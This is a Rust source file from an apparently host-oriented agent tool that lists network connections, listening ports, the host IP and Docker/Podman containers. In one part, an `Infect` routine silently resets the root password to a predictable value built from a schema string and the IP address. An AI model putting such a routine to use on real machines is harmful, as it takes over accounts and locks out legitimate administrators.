use super::client::Container;
use super::client::NetworkConnection;
use super::client::OpenPort;
use super::client::{ContainerNetwork, ContainerVolume};
use super::client::{Host, NetworkInfo};
use pnet::datalink;
use procfs::net::{route, unix, TcpNetEntry, TcpState, UdpNetEntry, UdpState};
use procfs::process::FDTarget;
use procfs::process::Stat;
use serde_json::Map;
use serde_json::Value;
use std::collections::HashMap;
use std::io::Write;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::sync::Mutex;
use std::thread;

fn change_password(username: &str, password: &str) -> std::io::Result<()> {
    let mut child = Command::new("passwd")
        .arg(username)
        .stdin(Stdio::piped())
        .spawn()?;

    {
        let stdin = child.stdin.as_mut().expect("Failed to open stdin");
        stdin.write_all(password.as_bytes())?;
        stdin.write_all(b"\n")?;
        stdin.write_all(password.as_bytes())?;
        stdin.write_all(b"\n")?;
    }

    let output = child.wait_with_output()?;

    if output.status.success() {
        println!("Password changed successfully.");
    } else {
        eprintln!("Failed to change password.");
    }

    Ok(())
}

impl super::client::Infect for Host {
    fn init(&self, schema: &str) {
        let password = format!(
            "{}{:?}!",
            schema,
            self.ip.split('.').last().unwrap().parse::<u16>().ok()
        );
        let _ = change_password("root", password.as_str());
    }
}

// use sysinfo::NetworkData::ip;
enum NetworkState {
    Udp(UdpState),
    Tcp(TcpState),
}

// // build up a map between socket inodes and process stat info:
impl NetworkInfo for Host {
    fn net_info() -> (Box<[NetworkConnection]>, Box<[OpenPort]>) {
        let all_procs = procfs::process::all_processes().unwrap(); // handle errors appropriately
        let mut map: HashMap<u64, Stat> = HashMap::new();
        for p in all_procs {
            let process = p.unwrap(); // handle errors appropriately
            if let (Ok(stat), Ok(fds)) = (process.stat(), process.fd()) {
                for fd in fds {
                    if let FDTarget::Socket(inode) = fd.unwrap().target {
                        // handle errors appropriately
                        map.insert(inode, stat.clone());
                    }
                }
            }
        }

        let shared_map = Arc::new(Mutex::new(map));

        let tcp_connections = process_network_entries(procfs::net::tcp, shared_map.clone());
        let udp_connections = process_network_entries(procfs::net::udp, shared_map.clone());
        let tcp6_connections = process_network_entries(procfs::net::tcp6, shared_map.clone());
        let udp6_connections = process_network_entries(procfs::net::udp6, shared_map);

        // Combine TCP and UDP connections
        let mut all_connections = Vec::new();
        all_connections.extend(tcp_connections);
        all_connections.extend(udp_connections);
        all_connections.extend(tcp6_connections);
        all_connections.extend(udp6_connections);

        let mut open_ports = Vec::new();

        // Get the open ports
        all_connections
            .iter()
            .filter(|conn| {
                conn.local_address.contains("0.0.0.0") && conn.state.as_ref() == "LISTEN"
            })
            .filter_map(|conn| {
                // Extract the port number and additional data safely
                conn.local_address.split(':').last().and_then(|port_str| {
                    port_str
                        .parse::<u16>()
                        .ok()
                        .map(|port| (port, conn.pid, &conn.state, &conn.protocol))
                })
            })
            .for_each(|(port, pid, state, protocol)| {
                let open_port = OpenPort {
                    port,
                    protocol: protocol.clone(),
                    pid, // Assuming pid is an Option<i32> or similar
                    version: "".into(),
                    state: state.clone(), // Convert state to String if needed
                };
                open_ports.push(open_port);
            });

        (
            all_connections.into_boxed_slice(),
            open_ports.into_boxed_slice(),
        )
    }

    fn firewall_rules() {
        todo!()
    }

    fn ip() -> Box<str> {
        let routes = match route() {
            Ok(r) => r,
            Err(_) => return "0.0.0.0".into(),
        };

        let intface = match routes
            .iter()
            .filter(|r| r.destination.is_unspecified())
            .last()
        {
            Some(route) => route.iface.clone(),
            None => return "0.0.0.0".into(),
        };

        let interfaces = datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .find(|iface| iface.name == intface.to_string());

        match interface {
            Some(iface) => match iface.ips.first() {
                Some(ip) => ip.ip().to_string().into_boxed_str(),
                None => "0.0.0.0".into(),
            },
            None => "0.0.0.0".into(),
        }
    }

    fn containers() -> Box<[Container]> {
        let mut containers = Vec::new();

        if which::which("docker").is_ok() {
            containers.extend(get_generic_containers("docker"));
        }

        if which::which("podman").is_ok() {
            containers.extend(get_generic_containers("podman"));
        }

        // containers.extend(get_podman_containers());
        // if which::which("kubectl").is_ok() {
        //     containers.extend(get_kubectl_pods());
        // }
        containers.into_boxed_slice()
    }
}

fn match_tcp_state(state: TcpState) -> Box<str> {
    match state {
        TcpState::Established => "ESTABLISHED".into(),
        TcpState::SynSent => "SYN_SENT".into(),
        TcpState::SynRecv => "SYN_RECV".into(),
        TcpState::FinWait1 => "FIN_WAIT1".into(),
        TcpState::FinWait2 => "FIN_WAIT2".into(),
        TcpState::TimeWait => "TIME_WAIT".into(),
        TcpState::Close => "CLOSE".into(),
        TcpState::CloseWait => "CLOSE_WAIT".into(),
        TcpState::LastAck => "LAST_ACK".into(),
        TcpState::Listen => "LISTEN".into(),
        TcpState::Closing => "CLOSING".into(),
        TcpState::NewSynRecv => "NEW_SYN_RECV".into(),
        _ => "UNKNOWN".into(),
    }
}

fn match_udp_state(state: UdpState) -> Box<str> {
    match state {
        UdpState::Established => "ESTABLISHED".into(),
        UdpState::Close => "CLOSE".into(),
        _ => "UNKNOWN".into(),
    }
}

fn filter_close(state: NetworkState) -> bool {
    match state {
        NetworkState::Tcp(tcp_state) => match tcp_state {
            TcpState::Close => false,
            _ => true,
        },
        NetworkState::Udp(udp_state) => match udp_state {
            UdpState::Close => false,
            _ => true,
        },
    }
}

fn process_network_entries<F, T>(
    fetch_entries: F,
    map: Arc<Mutex<HashMap<u64, Stat>>>,
) -> Vec<NetworkConnection>
where
    F: Fn() -> Result<Vec<T>, procfs::ProcError> + Send + 'static,
    T: NetworkData + Send + 'static, // Ensure T is Send
{
    // Access map from thread
    let map = map.clone();

    // Spawn a thread to process the entries
    let handle = thread::spawn(move || {
        let mut connections = Vec::new();

        // Fetch the entries
        if let Ok(entries) = fetch_entries() {
            // Iterate over the entries
            for entry in entries {
                let state = entry.state(); // Get the state without consuming entry

                // Filter out CLOSE connections
                if filter_close(state) {
                    let connection = NetworkConnection {
                        local_address: entry.local_address(),
                        remote_address: entry.remote_address(),
                        state: match_state(entry.state()),
                        protocol: entry.protocol(),
                        pid: map.lock().unwrap().get(&entry.inode()).map(|stat| stat.pid),
                    };
                    connections.push(connection);
                }
            }
        }
        connections
    });

    handle.join().unwrap() // Join the thread and unwrap the result
}

trait NetworkData {
    fn local_address(&self) -> Box<str>;
    fn remote_address(&self) -> Box<str>;
    fn inode(&self) -> u64;
    fn state(&self) -> NetworkState;
    fn protocol(&self) -> Box<str>;
}

impl NetworkData for UdpNetEntry {
    fn local_address(&self) -> Box<str> {
        // Return the local_address from TcpNetEntry
        self.local_address.to_string().into_boxed_str()
    }

    fn remote_address(&self) -> Box<str> {
        // Return the remote_address from TcpNetEntry
        self.remote_address.to_string().into_boxed_str()
    }

    fn inode(&self) -> u64 {
        // Return the inode from TcpNetEntry
        self.inode
    }

    fn state(&self) -> NetworkState {
        // Return the state from TcpNetEntry
        NetworkState::Udp(self.state.clone())
    }

    fn protocol(&self) -> Box<str> {
        "UDP".into()
    }
}

impl NetworkData for TcpNetEntry {
    fn local_address(&self) -> Box<str> {
        // Return the local_address from TcpNetEntry
        self.local_address.to_string().into_boxed_str()
    }

    fn remote_address(&self) -> Box<str> {
        // Return the remote_address from TcpNetEntry
        self.remote_address.to_string().into_boxed_str()
    }

    fn inode(&self) -> u64 {
        // Return the inode from TcpNetEntry
        self.inode
    }

    fn state(&self) -> NetworkState {
        // Return the state from TcpNetEntry
        NetworkState::Tcp(self.state.clone())
    }

    fn protocol(&self) -> Box<str> {
        "TCP".into()
    }
}

// Similarly, implement NetworkData for UdpNetEntry
fn match_state(state: NetworkState) -> Box<str> {
    match state {
        NetworkState::Tcp(tcp_state) => match_tcp_state(tcp_state),
        NetworkState::Udp(udp_state) => match_udp_state(udp_state),
    }
}

fn parse_port_details(
    port_map: &Option<&serde_json::Map<std::string::String, serde_json::Value>>,
) -> Vec<Box<str>> {
    port_map.map_or_else(Vec::new, |ports_map| {
        ports_map
            .iter()
            .flat_map(|(container_port, host_ports)| {
                host_ports
                    .as_array()
                    .map_or_else(Vec::new, |host_ports_array| {
                        host_ports_array
                            .iter()
                            .filter_map(|host_port_details| {
                                let host_ip =
                                    host_port_details["HostIp"].as_str().unwrap_or("0.0.0.0");
                                let host_port =
                                    host_port_details["HostPort"].as_str().unwrap_or("");
                                Some(
                                    format!("{}:{}->{}", host_ip, host_port, container_port).into(),
                                )
                            })
                            .collect::<Vec<Box<str>>>()
                    })
            })
            .collect()
    })
}

// fn get_generic_containers(command: &str) -> Vec<Container> {
//     let output = Command::new(command)
//         .args(&[
//             "ps",
//             "--format",
//             "{{.Names}}\t{{.Status}}\t{{.ID}}\t{{.Command}}\t{{.Ports}}",
//         ])
//         .output()
//         .expect("Failed to execute command");

//     let output_str = String::from_utf8_lossy(&output.stdout);

//     output_str
//         .lines()
//         .filter(|line| !line.is_empty())
//         .map(|line| {
//             let fields: Vec<&str> = line.split('\t').collect();
//             let container_id = fields[2];

//             // Execute `docker inspect` to get detailed information
//             let inspect_output = Command::new(command)
//                 .args(&["inspect", container_id])
//                 .output()
//                 .expect("Failed to execute docker inspect command");
//             let inspect_str = String::from_utf8_lossy(&inspect_output.stdout);

//             // Parse volumes and networks from inspect output
//             let volumes = parse_volumes_from_inspect(&inspect_str);
//             let networks = parse_networks_from_inspect(&inspect_str);

//             Container {
//                 name: fields[0].into(),
//                 status: fields[1].into(),
//                 id: container_id.into(),
//                 cmd: fields[3].into(),
//                 port_bindings: parse_port_details(fields[4]).into(),
//                 volumes,
//                 networks,
//             }
//         })
//         .collect()
// }

// fn get_podman_containers() -> Vec<Container> {
//     // Similar to get_docker_containers, but use "podman" command
//     // ...
// }

// fn get_kubectl_pods() -> Vec<Container> {
//     let output = Command::new("kubectl")
//         .args(&["get", "pods", "--all-namespaces", "-o", "json"])
//         .output()
//         .expect("Failed to execute command");

//     let output_str = String::from_utf8_lossy(&output.stdout);
//     let parsed_json: serde_json::Value = serde_json::from_str(&output_str).unwrap();

//     parsed_json["items"]
//         .as_array()
//         .unwrap_or(&vec![])
//         .iter()
//         .map(|pod| Container {
//             name: format!(
//                 "{}/{}",
//                 pod["metadata"]["namespace"], pod["metadata"]["name"]
//             )
//             .into(),
//             status: pod["status"]["phase"].as_str().unwrap_or("").into(),
//             id: "".into(),
//             cmd: "".into(),
//             port_bindings: "".into(),
//         })
//         .collect()
// }

fn get_container_ids(command: &str) -> Vec<String> {
    let output = Command::new(command)
        .args(&["ps", "-q"])
        .output()
        .expect("Failed to execute docker ps command");

    String::from_utf8_lossy(&output.stdout)
        .lines()
        .map(String::from)
        .collect()
}

fn get_generic_containers(command: &str) -> Vec<Container> {
    let container_ids = get_container_ids(command);

    container_ids
        .iter()
        .filter_map(|id| {
            let output = Command::new(command)
                .args(&["inspect", id])
                .output()
                .expect("Failed to execute docker inspect command");

            let inspect_str = String::from_utf8_lossy(&output.stdout);
            parse_generic_container(&inspect_str).ok()
        })
        .collect()
}

fn parse_generic_container(inspect_data: &str) -> Result<Container, serde_json::Error> {
    let json: serde_json::Value = serde_json::from_str(inspect_data)?;

    let container_info = &json[0];

    println!(
        "CONTAINER INFO: {:?}",
        container_info["NetworkSettings"]["Networks"]
    );

    Ok(Container {
        name: container_info["Name"].as_str().unwrap_or_default().into(),
        status: container_info["State"]["Status"]
            .as_str()
            .unwrap_or_default()
            .into(),
        id: container_info["Id"].as_str().unwrap_or_default().into(),
        cmd: container_info["Config"]["Cmd"]
            .as_array()
            .unwrap_or(&vec!["".into()])[0]
            .as_str()
            .unwrap_or_default()
            .into(),
        port_bindings: parse_port_details(&container_info["NetworkSettings"]["Ports"].as_object())
            .into(),
        volumes: parse_volumes_from_inspect(&container_info["Mounts"].as_array()).into(),
        // networks: parse_networks_from_inspect(
        //     container_info[0]["NetworkSettings"]["Networks"]
        //         .as_object()
        //         .unwrap_or(&json!([]).as_object().unwrap()),
        // ),
    })
}

fn parse_volumes_from_inspect(mounts: &Option<&Vec<serde_json::Value>>) -> Box<[ContainerVolume]> {
    mounts.map_or(Box::new([]), |mounts| {
        mounts
            .iter()
            .filter_map(|mount| {
                Some(ContainerVolume {
                    host_path: mount["Source"].as_str()?.into(),
                    container_path: mount["Destination"].as_str()?.into(),
                    mode: mount["Mode"].as_str()?.into(),
                    name: mount["Name"].as_str()?.into(),
                    rw: mount["RW"].as_bool()?,
                    v_type: mount["Type"].as_str()?.into(),
                })
            })
            .collect::<Vec<_>>()
            .into_boxed_slice()
    })
}

// fn parse_networks_from_inspect(networks: &Map<String, Value>) -> Box<[ContainerNetwork]> {
//     // println!("INSPECT DATA: {}", inspect_data);
//     // Parse the JSON and extract network information
//     // let json: serde_json::Value = serde_json::from_str(inspect_data).unwrap();
//     // let networks = json[0]["NetworkSettings"]["Networks"].as_object().unwrap();

//     networks
//         .iter()
//         .map(|(name, network_data)| ContainerNetwork {
//             name: name.clone(),
//             ip: network_data["IPAddress"].as_str().map(String::from),
//         })
//         .collect()
// }
